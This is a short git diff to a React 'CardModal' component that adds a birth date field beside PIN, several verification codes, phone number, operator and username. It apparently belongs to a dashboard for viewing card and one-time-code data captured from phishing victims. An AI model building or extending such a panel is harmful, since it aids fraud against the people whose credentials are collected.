@@ -113,6 +113,7 @@ export default function CardModal({ ip, user, onClose }) {
         pin = "",
         verification_code_two = "",
         phoneNumber = "",
+        birthDate = "",
         operator = "",
         verification_code_three = "",
         username = "",
@@ -252,6 +253,9 @@ export default function CardModal({ ip, user, onClose }) {
                             </p>
                             <p style={{ marginBottom: "0.5rem" }}>
                                 <strong>Operator:</strong> {operator || "—"}
+                            </p>
+                            <p style={{ marginBottom: "0.5rem" }}>
+                                <strong>birthDate:</strong> {birthDate || "—"}
                             </p>
                             <p
                                 className={blinkPhoneOtp ? "blink-green-text" : ""}
